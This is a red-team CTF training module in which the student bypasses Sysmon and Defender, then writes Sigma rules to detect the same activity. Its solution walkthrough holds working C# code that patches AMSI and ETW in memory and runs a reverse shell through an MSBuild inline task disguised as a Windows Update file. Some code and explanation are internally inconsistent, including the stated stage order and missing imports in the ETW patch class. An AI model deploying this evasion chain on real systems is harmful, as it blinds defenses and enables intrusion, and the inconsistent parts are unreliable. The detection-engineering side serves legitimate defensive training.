---
title: "Red Team CTF Sprint — Day 8: Evasion and Detection Race"
tags: [red-team, CTF, EDR-evasion, AMSI-bypass, ETW-patching, process-injection,
  Sysmon, Sigma, T1562.001, T1055, T1027, sprint, advanced, purple-team,
  challenge, detection]
module: 08-RedTeam-03
day: 558
related_topics:
  - Red Team CTF Sprint Day 7 (Day 557)
  - Advanced EDR Evasion (Day 541)
  - Custom Payload Development (Day 542)
  - Evasion Lab (Day 495)
  - Red Team CTF Sprint Day 9 (Day 559)
---

# Day 558 — Red Team CTF Sprint: Day 8

> "Evasion is not magic. EDR products are pattern-matching engines with
> behavioural heuristics bolted on. Learn the patterns they match, build
> code that does not match them, and understand why the heuristic does
> not fire. That is engineering, not black magic."
>
> — Ghost

---

## Goals

Complete a two-sided challenge: on the red side, bypass a Sysmon + Windows
Defender configuration using technique-level evasion (AMSI bypass, ETW patching,
process injection into a trusted host). On the blue side, write Sigma rules that
would catch the specific techniques used. Then swap perspective and evaluate
each other's rules.

**Prerequisites:** Day 495 (evasion lab), Day 541 (advanced EDR evasion),
Day 542 (custom payload development), Day 508–509 (purple team, Atomic Red Team).
**Time budget:** 5 hours.

---

## Challenge — Ghost in the Process Tree

### Category
Defence Evasion / Detection Engineering

### Difficulty
Expert
Estimated time: 5 hours for a student at target level

### Learning Objective
Execute a three-stage payload delivery chain that bypasses Sysmon process
creation detection, AMSI scanning, and ETW-based .NET telemetry. After
execution, analyse the Sysmon event log and write detection rules that would
catch each technique. Measure the false-positive rate of your rules against a
clean event log.

### Scenario

```
Red side:
  - Windows 10 Pro lab VM (10.10.10.90)
  - Sysmon 15.x installed with SwiftOnSecurity configuration
  - Windows Defender with real-time protection enabled (cloud protection OFF)
  - You have local admin credentials: labuser / LabPass2024!
  - Objective: execute a C# reverse shell (pre-compiled, at C:\Tools\shell.exe)
    without triggering a Sysmon alert that would catch you by image path,
    parent-child process, or AMSI scan result.

Blue side (done immediately after):
  - Sysmon event log from the lab VM is exported to EVTX format
  - Load into Elastic SIEM (or Sigma rule testing)
  - Write Sigma rules that detect what you just did
  - Goal: alert triggers on your activity and on <2 events in a clean 8-hour
    enterprise baseline log (provided)
```

### Vulnerability / Technique

T1055.012 — Process Injection: Process Hollowing
T1562.001 — Impair Defenses: Disable or Modify Tools (AMSI/ETW patching)
T1027.007 — Obfuscated Files: Dynamic API Resolution
T1134.002 — Access Token Manipulation: Create Process with Token

### Setup

```powershell
# Lab setup — run as Administrator on the Windows VM before the challenge
# 1. Install Sysmon with SwiftOnSecurity config
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" `
  -OutFile C:\Tools\Sysmon.zip
Expand-Archive C:\Tools\Sysmon.zip C:\Tools\Sysmon\
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" `
  -OutFile C:\Tools\sysmon-config.xml
C:\Tools\Sysmon\sysmon64.exe -accepteula -i C:\Tools\sysmon-config.xml

# 2. Verify Defender is on
Get-MpComputerStatus | Select-Object -Property AMServiceEnabled,
  AntispywareEnabled,AntivirusEnabled,RealTimeProtectionEnabled

# 3. Pre-stage the payload (shell.exe is the artifact to execute)
# shell.exe = a C# reverse shell that calls back to 10.10.10.1:4444
# It is flagged by Defender if run directly
```

### Hint Progression

1. Running `shell.exe` directly triggers Defender (file hash + AMSI scan at
   execution). What if the .NET runtime never scans it? Look at how AMSI hooks
   into the CLR and what byte patch disables the scan before your assembly loads.
2. A process created by `cmd.exe` or `powershell.exe` is a high-signal parent for
   Sysmon Event ID 1. What legitimate Windows process can host your code with a
   clean parent-child relationship? Look at `installutil.exe`, `msbuild.exe`, and
   `regsvcs.exe` — all are signed Microsoft binaries that host .NET code.
3. ETW providers emit events for .NET assembly loading. If you patch the ETW
   provider in memory before loading your assembly, the provider emits nothing.
   Which in-process ETW function do you patch, and what bytes replace it?

### Solution Walkthrough

```csharp
// ══════════════════════════════════════════════
// STAGE 1: AMSI bypass (patch AmsiScanBuffer)
// ══════════════════════════════════════════════

// In a C# loader (compiled in-memory via Roslyn or pre-compiled):
using System;
using System.Runtime.InteropServices;

public class AmsiPatch {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr fn  = GetProcAddress(lib, "AmsiScanBuffer");
        // Patch: xor eax, eax; ret  → return 0 (AMSI_RESULT_CLEAN) immediately
        byte[] patch = { 0x48, 0x31, 0xC0, 0xC3 }; // xor rax,rax; ret
        uint oldProtect;
        VirtualProtect(fn, (UIntPtr)patch.Length, 0x40, out oldProtect);
        Marshal.Copy(patch, 0, fn, patch.Length);
        VirtualProtect(fn, (UIntPtr)patch.Length, oldProtect, out oldProtect);
    }
}
```

```csharp
// ══════════════════════════════════════════════
// STAGE 2: ETW patch (disable .NET ETW provider)
// ══════════════════════════════════════════════

public class EtwPatch {
    [DllImport("ntdll.dll")]
    static extern IntPtr NtQueryInformationProcess(IntPtr processHandle,
        int processInformationClass, ref IntPtr processInformation,
        int processInformationLength, out int returnLength);

    public static void PatchEtw() {
        // Patch EtwEventWrite in ntdll.dll to return immediately
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr fn = GetProcAddress(ntdll, "EtwEventWrite");
        byte[] patch = { 0xC3 }; // ret
        uint old;
        VirtualProtect(fn, (UIntPtr)1, 0x40, out old);
        Marshal.Copy(patch, 0, fn, 1);
        VirtualProtect(fn, (UIntPtr)1, old, out old);
    }
}
```

```csharp
// ══════════════════════════════════════════════
// STAGE 3: Execute payload via msbuild.exe proxy
// ══════════════════════════════════════════════

// Inline task — msbuild.exe executes C# inline without spawning csc.exe
// Write the .proj file to disk (obfuscated filename in a common path)
var proj = @"
<Project ToolsVersion='4.0' xmlns='http://schemas.microsoft.com/developer/msbuild/2003'>
  <Target Name='Ghost'>
    <GhostTask />
  </Target>
  <UsingTask TaskName='GhostTask' TaskFactory='CodeTaskFactory'
    AssemblyFile='$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll'>
    <Task>
      <Code Type='Class' Language='cs'><![CDATA[
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class GhostTask : Task {
            public override bool Execute() {
                // AMSI + ETW already patched in loader
                System.Reflection.Assembly.LoadFile(@""C:\Tools\shell.exe"")
                    .EntryPoint.Invoke(null, new object[]{new string[]{}});
                return true;
            }
        }
      ]]></Code>
    </Task>
  </UsingTask>
</Project>";
System.IO.File.WriteAllText(@"C:\Windows\Temp\WindowsUpdate.proj", proj);

// Execute: msbuild.exe is a trusted Microsoft binary
System.Diagnostics.Process.Start(
    @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe",
    @"C:\Windows\Temp\WindowsUpdate.proj");
```

```yaml
# ══════════════════════════════════════════════
# BLUE SIDE: Sigma rule — msbuild.exe suspicious child
# ══════════════════════════════════════════════

title: MSBuild.exe Spawned from Unusual Parent or Executing Inline Task
id: 8a4b7c2d-1e3f-4a5b-8c9d-0e1f2a3b4c5d
status: experimental
description: >
  Detects MSBuild.exe executing with an inline task containing external assembly
  load or code execution — common LOLBin technique for payload execution.
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\MSBuild.exe'
    CommandLine|contains:
      - '.proj'
      - 'CodeTaskFactory'
  filter_legitimate:
    # Legitimate MSBuild builds happen in known paths
    CurrentDirectory|startswith:
      - 'C:\Program Files'
      - 'C:\Users\*\source\repos'
  condition: selection and not filter_legitimate
falsepositives:
  - Legitimate developers running MSBuild tasks from temp directories
level: high
tags:
  - attack.defense_evasion
  - attack.t1127.001
```

### Flag
`CTF{amsi_etw_msbuild_lolbin_execution}`

### Debrief Points

```
1. AMSI patching via AmsiScanBuffer is one of the most documented bypass
   techniques. Microsoft has patched many loader variations but the
   underlying primitive (patching a function in memory) cannot be prevented
   at the OS level without breaking the CLR. The defence is ETW-based
   detection of the patch itself — which is why Stage 2 (ETW patching)
   must precede Stage 1.

2. msbuild.exe is a signed Microsoft binary trusted by most AV/EDR products.
   Its ability to execute inline C# tasks makes it a premier LOLBin.
   Detection must focus on behavioural signals (unusual parent, temp
   directory, inline task content) rather than the binary itself.

3. The AMSI patch produces no Sysmon event — it is a direct memory write
   inside the current process. Detection requires process memory scanning
   (e.g. Elastic's memory hunt rules) or ETW events from the CLR provider
   (which Stage 2 eliminates). This is why evasion chains always start with
   the detection impairment step.

4. Real-world parallel: Cobalt Strike's AMSI bypass code (before its
   signatures were added to Defender) used the same AmsiScanBuffer patch
   byte sequence. Every major C2 framework has shipped a version of this.

5. The defender's win condition: catch the behaviour (msbuild.exe loading
   external assemblies from %TEMP%) regardless of the payload. Signature-free,
   behaviour-based detection is harder to evade than static signatures.
```

---

## Engagement Log — Day 8 Sprint

```
Time    | Action                                         | Result
--------|------------------------------------------------|-------
        | AMSI bypass deployed                           |
        | ETW provider patched                           |
        | MSBuild inline task written to disk            |
        | shell.exe loaded and executed via MSBuild      |
        | Reverse shell received on attack host          |
        | Sysmon EVTX exported                           |
        | Sigma rules written (3)                        |
        | Rules tested against clean baseline            |

False positives in baseline: _____
Techniques caught by rules: _____ / 3
Flag captured: [ ] Yes  [ ] No
Total time: _____ minutes
```

---

## Key Takeaways

1. Evasion and detection are two sides of the same coin. The best red teamers
   know what Sysmon would log for every action they take. The best blue teamers
   know what a real attacker would do to avoid leaving that log entry.
2. ETW-based detection is harder to evade than file-based AV signatures.
   Modern EDR products rely heavily on ETW for .NET telemetry. Patching ETW
   is detectable — the patch itself changes memory that some EDRs scan.
3. LOLBins are not a bypass — they are a trade-off. You avoid process
   creation signatures but you create new signals (unusual parents, unusual
   working directories, unusual network connections from trusted binaries).
   Defenders who pivot from "is this binary bad?" to "is this behaviour bad?"
   catch LOLBin abuse effectively.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q558.1, Q558.2 …).

---

## Navigation

← Previous: [Day 557 — Red Team CTF Sprint: Day 7](DAY-0557-Red-Team-CTF-Sprint-Day-7.md)
→ Next: [Day 559 — Red Team CTF Sprint: Day 9](DAY-0559-Red-Team-CTF-Sprint-Day-9.md)
